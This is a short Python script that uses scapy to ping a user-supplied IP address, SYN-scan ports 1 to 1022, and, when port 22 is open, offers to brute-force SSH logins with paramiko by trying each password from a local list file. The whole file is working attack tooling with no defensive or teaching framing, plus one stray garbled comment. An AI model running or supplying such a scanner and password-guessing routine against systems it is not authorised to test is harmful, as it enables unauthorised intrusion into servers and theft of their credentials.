from scapy.all import *
import paramiko  # cannot import this kup[aaaaaa
from scapy.layers.inet import TCP, IP, ICMP


def main():
    target = input("Insert IP Addr: ")
    Registered_Ports = range(1, 1023)
    open_ports = []

    if checkTarget(target):
        for x in Registered_Ports:
            status = scanport(x, target)
            if status:
                open_ports.append(x)
                print("Port {} is open...".format(x))
        print("Finished Scanning")
        if 22 in open_ports:
            print("Port 22 is open.")
            x = input("Port 22 is open, do you want to perform bruteForce attack? [Y]/[N]")
            if x.__eq__('Y') or x.__eq__('y'):
                BruteForce(22, target)
        print(*open_ports)


def checkTarget(target):
    try:
        conf.verb = 0
        ICMPpkt = sr1(IP(dst=target) / ICMP(), timeout=3)
        if ICMPpkt:
            print("ICMP packet sent successfully...")
            return True
        else:
            print("ICMP packet didnt return.")
            return False
    except Exception as err:
        print(err)
        return False


def scanport(port, target):
    source_port = RandShort()
    conf.verb = 0
    SynPkt = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    if SynPkt:
        if SynPkt.haslayer(TCP):
            if SynPkt.getlayer(TCP).flags == 0x12:
                sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="R"), timeout=2)
                return True
        else:
            # print("Synchronization packet with no TCP layer")
            return False
    else:
        # print("Synchronization packet is empty. destinationPort = {}".format(port))
        return False


def BruteForce(port, target):
    with open("PasswordList.txt", 'r') as file:
        passwords = file.readlines()
        passwords = [line.rstrip() for line in passwords]

    user = input("Insert server login's username:")
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in passwords:
        try:
            SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
            print("{} matches.".format(password))
            SSHconn.close()
            break
        except Exception:
            print("{} failed.".format(password))


if __name__ == '__main__':
    main()
